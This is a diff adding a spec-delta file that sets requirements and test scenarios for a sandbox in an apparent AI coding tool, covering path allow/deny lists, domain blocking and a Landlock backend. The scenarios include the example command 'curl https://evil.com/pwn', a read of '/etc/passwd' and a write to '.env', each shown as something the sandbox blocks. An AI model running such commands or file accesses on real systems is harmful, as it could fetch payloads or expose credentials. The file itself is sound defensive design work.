@@ -1,0 +1,13 @@
+kind: llman.sdd.delta
+ops[5]{op,req_id,title,statement,from,to,name}:
+  add_requirement,s10,"sandbox-config-struct","System MUST define a SandboxConfig struct with enabled, filesystem (read_allowed, read_denied, write_allowed, write_denied), network (allowed_domains, denied_domains), and process (allowed_paths) fields, loadable from config.yaml tiered merge.",null,null,null
+  add_requirement,s11,"sandbox-fs-enforcement","Filesystem tools (read, write, edit) SHALL check SandboxEngine before execution. When a path matches write_denied or does not match read_allowed (when read_allowed is non-empty), the tool SHALL return an access-denied error.",null,null,null
+  add_requirement,s12,"sandbox-network-enforcement","Bash execution SHALL check network.allowed_domains and network.denied_domains for URLs appearing in command text. When a domain is denied or not in allowed_domains (when allowed_domains is non-empty), the execution SHALL be blocked.",null,null,null
+  add_requirement,s13,"sandbox-engine-trait","System MUST provide a SandboxEngine trait with check_read(path), check_write(path), check_network(domain), check_process(path) methods. A platform-specific backend (Landlock on Linux >=5.13) MAY provide OS-level enforcement; a fallback backend SHALL do application-level pattern matching.",null,null,null
+  add_requirement,s14,"sandbox-default-deny-unlisted","When sandbox.filesystem.read_allowed is non-empty, any path not matching an allowed pattern SHALL be treated as denied (default-deny). When network.allowed_domains is non-empty, any domain not matching an allowed pattern SHALL be treated as denied.",null,null,null
+op_scenarios[5]{req_id,id,given,when,then}:
+  s10,"load-config","config.yaml has sandbox.filesystem.deny_write=['.env']","config loads","SandboxConfig.write_denied contains '.env'"
+  s11,"block-env-write","sandbox enabled with deny_write=['.env']","edit tool writes to '.env'","engine returns access-denied error"
+  s12,"block-evil-domain","sandbox enabled with denied_domains=['evil.com']","bash runs 'curl https://evil.com/pwn'","execution is blocked with domain-denied reason"
+  s13,"landlock-available","Linux kernel >=5.13 with Landlock enabled","engine initializes","backend is LandlockBackend, not FallbackBackend"
+  s14,"default-deny-read","read_allowed=['/home/user/project']","read tool reads '/etc/passwd'","engine returns access-denied"
